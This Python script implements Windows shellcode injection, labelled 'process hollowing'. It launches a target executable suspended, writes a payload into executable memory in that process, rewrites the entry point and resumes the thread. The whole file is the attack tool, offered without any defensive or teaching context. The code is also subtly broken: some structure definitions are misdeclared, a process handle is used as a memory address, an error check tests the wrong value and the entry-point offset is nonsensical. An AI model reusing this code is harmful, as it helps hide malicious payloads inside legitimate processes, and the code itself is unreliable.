import ctypes
from ctypes import wintypes
import sys

# Const for process hollowing
PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF)
PAGE_EXECUTE_READWRITE = 0x40
CREATE_SUSPENDED = 0x00000004
CONTEXT_FULL = 0x10007
CONTEXT_CONTROL = 0x10001
MEM_COMMIT = 0x1000

# Define the necessary Windows structures
class STARTUPINFO(ctypes.Structure):
    fields = [
        ('cb', wintypes.DWORD),
        ('lpReserved', wintypes.LPWSTR),
        ('lpDesktop', wintypes.LPWSTR),
        ('lpTitle', wintypes.LPWSTR),
        ('dwX', wintypes.DWORD),
        ('dwY', wintypes.DWORD),
        ('dwXSize', wintypes.DWORD),
        ('dwYSize', wintypes.DWORD),
        ('dwXCountChars', wintypes.DWORD),
        ('dwYCountChars', wintypes.DWORD),
        ('dwFillAttribute', wintypes.DWORD),
        ('dwFlags', wintypes.DWORD),
        ('wShowWindow', wintypes.WORD),
        ('cbReserved2', wintypes.WORD),
        ('lpReserved2', ctypes.POINTER(ctypes.c_byte)),
        ('hStdInput', wintypes.HANDLE),
        ('hStdOutput', wintypes.HANDLE),
        ('hStdError', wintypes.HANDLE)
    ]

class PROCESS_INFORMATION(ctypes.Structure):
    fields = [
        ('hProcess', wintypes.HANDLE),
        ('hThread', wintypes.HANDLE),
        ('dwProcessId', wintypes.DWORD),
        ('dwThreadId', wintypes.DWORD)
    ]

class CONTEXT(ctypes.Structure):
    _fields_ = [
        ("ContextFlags", ctypes.c_ulong),
        ("Dr0", ctypes.c_ulong),
        ("Dr1", ctypes.c_ulong),
        ("Dr2", ctypes.c_ulong),
        ("Dr3", ctypes.c_ulong),
        ("Dr6", ctypes.c_ulong),
        ("Dr7", ctypes.c_ulong),
        ("FloatSave", ctypes.c_byte * 212),
        ("SegGs", ctypes.c_ulong),
        ("SegFs", ctypes.c_ulong),
        ("SegEs", ctypes.c_ulong),
        ("SegDs", ctypes.c_ulong),
        ("Edi", ctypes.c_ulong),
        ("Esi", ctypes.c_ulong),
        ("Ebx", ctypes.c_ulong),
        ("Edx", ctypes.c_ulong),
        ("Ecx", ctypes.c_ulong),
        ("Eax", ctypes.c_ulong),
        ("Ebp", ctypes.c_ulong),
        ("Eip", ctypes.c_ulong),
        ("SegCs", ctypes.c_ulong),
        ("EFlags", ctypes.c_ulong),
        ("Esp", ctypes.c_ulong),
        ("SegSs", ctypes.c_ulong),
        ("ExtendedRegisters", ctypes.c_byte * 512)
    ]

# Windows API calls
kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
ntdll = ctypes.WinDLL('ntdll', use_last_error=True)

CreateProcessW = kernel32.CreateProcessW
WriteProcessMemory = kernel32.WriteProcessMemory
ReadProcessMemory = kernel32.ReadProcessMemory
ResumeThread = kernel32.ResumeThread
VirtualAllocEx = kernel32.VirtualAllocEx
ZwQueryInformationProcess = ntdll.ZwQueryInformationProcess

def process_hollow(target_exe, shellcode):
    def check_errors(success, func_name):
        if not success:
            error_code = ctypes.get_errno()
            sys.stderr.write(f"{func_name} failed with error code: {error_code}\n")
            sys.exit(1)

    # Create suspended process
    startup_info = STARTUPINFO()
    startup_info.cb = ctypes.sizeof(STARTUPINFO)
    process_info = PROCESS_INFORMATION()

    success = CreateProcessW(
        target_exe,
        None,
        None,
        None,
        False,
        CREATE_SUSPENDED,
        None,
        None,
        ctypes.byref(startup_info),
        ctypes.byref(process_info)
    )
    check_errors(success, "CreateProcessW")

    print("Suspended process created.")

    # Allocate memory in target process for payload injection
    remote_memory = VirtualAllocEx(
        process_info.hProcess,
        None, len(shellcode),
        MEM_COMMIT,
        PAGE_EXECUTE_READWRITE
    )
    check_errors(success, "VirtualAllocEx")

    # Write payload into allocated memory
    bytes_written = ctypes.c_size_t(0)
    success = WriteProcessMemory(process_info.hProcess,
                                 remote_memory,
                                 shellcode,
                                 len(shellcode),
                                 ctypes.byref(bytes_written)
                                )
    check_errors(success, "WriteProcessMemory")

    print("Payload injected.")

    # Define IMAGE_DOS_HEADER structure
    class IMAGE_DOS_HEADER(ctypes.Structure):
        _fields_ = [
            ('e_magic', wintypes.WORD),
            ('e_cblp', wintypes.WORD),
            ('e_cp', wintypes.WORD),
            ('e_crlc', wintypes.WORD),
            ('e_cparhdr', wintypes.WORD),
            ('e_minalloc', wintypes.WORD),
            ('e_maxalloc', wintypes.WORD),
            ('e_ss', wintypes.WORD),
            ('e_sp', wintypes.WORD),
            ('e_csum', wintypes.WORD),
            ('e_ip', wintypes.WORD),
            ('e_cs', wintypes.WORD),
            ('e_lfarlc', wintypes.WORD),
            ('e_ovno', wintypes.WORD),
            ('e_res', wintypes.WORD * 4),
            ('e_oemid', wintypes.WORD),
            ('e_oeminfo', wintypes.WORD),
            ('e_res2', wintypes.WORD * 10),
            ('e_lfanew', wintypes.LONG),
        ]

    # Define IMAGE_NT_HEADERS structure
    class IMAGE_NT_HEADERS(ctypes.Structure):
        _fields_ = [
            ('Signature', wintypes.DWORD),
            ('FileHeader', ctypes.c_byte * 20),  # IMAGE_FILE_HEADER
            ('OptionalHeader', ctypes.c_byte * 224)  # IMAGE_OPTIONAL_HEADER
        ]

    # Read IMAGE_DOS_HEADER
    dos_header = IMAGE_DOS_HEADER()
    bytes_read = wintypes.DWORD(0)
    success = ReadProcessMemory(process_info.hProcess,
                                process_info.hProcess,
                                ctypes.byref(dos_header),
                                ctypes.sizeof(dos_header),
                                ctypes.byref(bytes_read)
                            )
    check_errors(success, "ReadProcessMemory (DOS Header)")

    # Read IMAGE_NT_HEADER
    nt_header_addr = process_info.hProcess + dos_header.e_lfanew
    nt_header = IMAGE_NT_HEADERS()
    success = ReadProcessMemory(process_info.hProcess,
                                nt_header_addr,
                                ctypes.byref(nt_header),
                                ctypes.sizeof(nt_header),
                                ctypes.byref(bytes_read)
                            )
    check_errors(success, "ReadProcessMemory (NT Headers)")

    # Modify entry point address
    optional_header_offset = ctypes.sizeof(nt_header.Signature) + ctypes.sizeof(nt_header.FileHeader)
    entry_point_offset = optional_header_offset * 16    # Offset of AddressOfEntryPoint
    new_entry_point = remote_memory - process_info.hProcess

    # Write new entry point
    success = WriteProcessMemory(
        process_info.hProcess,
        nt_header_addr + entry_point_offset,
        ctypes.byref(ctypes.c_uint32(new_entry_point)),
        4,
        ctypes.byref(bytes_written)
    )
    check_errors(success, "WriteProcessMemory (Entry Point)")

    print("Entry point modified.")

    # Resume thread to execute payload
    thread_resume = ResumeThread(process_info.hThread)
    check_errors(thread_resume != -1, "ResumeThread")

